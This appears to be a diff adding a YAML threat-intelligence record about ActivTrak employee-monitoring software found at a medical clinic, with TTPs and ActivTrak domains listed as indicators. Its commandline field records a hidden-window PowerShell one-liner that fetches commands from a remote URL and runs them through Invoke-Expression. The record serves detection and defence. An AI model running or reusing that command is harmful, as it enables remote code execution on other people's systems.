@@ -1,0 +1,54 @@
+description: A review of a managed antivirus (MAV) exclusion for ActivTrak, an employee
+  monitoring software, revealed broad deployment on critical systems within a medical
+  clinic. This highlights potential data privacy risks and opportunities for improved
+  security oversight.
+attribution: Unknown
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - 'powershell -NoProfile -WindowStyle Hidden "Invoke-RestMethod -Uri https://77qq525TSoTCAy/
+    -OutputFormat JSON | ConvertFrom-Json | ForEach-Object {$_.Command} | Invoke-Expression" '
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination_address: https://77qq525TSoTCAy/
+    port: ''
+    url: https://77qq525TSoTCAy/
+  file_activity:
+  - path: C:\\Windows\\Temp\\BGStart.exe
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- url: https://agent-dl1.activtrak.net
+- url: https://agent-dl2.activtrak.net
+- url: https://agent-dl3.activtrak.net
+- url: https://prod-cart-gcp-us.activtrak.net
+- url: https://backend-master.activtrak.net
+- url: https://backend.activtrak.net
+- url: https://backend-gcp-us.activtrak.net
+- url: https://ws.activtrak.net
+- url: https://prod-frontendv2-gcp-us.activtrak.com
+- url: https://prod-reporting-us.activtrak.com
+- url: https://api.activtrak.com
+- url: https://backend-gcp-eu.activtrak.net
+- url: https://ws-gcp-eu.activtrak.net
+- url: https://api-eu.activtrak.com
+- url: https://backend-gcp-ca.activtrak.net
+- url: https://ws-gcp-ca.activtrak.net
+- url: https://api-ca.activtrak.com
+- url: https://backend-gcp-uk.activtrak.net
+- url: https://ws-gcp-uk.activtrak.net
+- url: https://api-uk.activtrak.com
+- url: https://master-backend.activtrak.net
+- url: https://backend-gcp-au.activtrak.net
+- url: https://ws-gcp-au.activtrak.net
+- url: https://api-au.activtrak.com
+authors:
+- Ben Bernstein
+reference: https://www.huntress.com/blog/how-proactive-account-review-uncovered-unauthorized-surveillance-tools
+date_of_publication: June 17, 2025
+file_creation_date: June 18, 2025
